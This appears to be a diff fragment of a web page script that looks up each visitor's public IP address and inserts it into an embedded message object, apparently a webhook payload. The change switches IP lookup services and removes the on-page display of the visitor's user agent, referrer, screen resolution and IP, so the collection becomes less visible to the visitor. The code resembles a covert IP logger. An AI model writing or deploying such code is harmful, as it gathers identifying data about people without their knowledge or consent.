@@ -31,7 +31,7 @@
             }
           ]
         };
-        fetch("https://api.ipify.org?format=json")
+        fetch("https://api4.my-ip.io/ip.json")
           .then(response => response.json())
           .then(data => {
             message.embeds[0].fields[3].value = data.ip;
@@ -45,11 +45,3 @@
           });
       });
       
-      document.getElementById("user-agent").textContent = navigator.userAgent;
-      document.getElementById("referrer").textContent = document.referrer;
-      document.getElementById("screen-resolution").textContent = screen.width + "x" + screen.height;
-      fetch("https://api.ipify.org?format=json")
-          .then(response => response.json())
-          .then(data => {
-            document.getElementById("ip-address").textContent = data.ip;
-          });
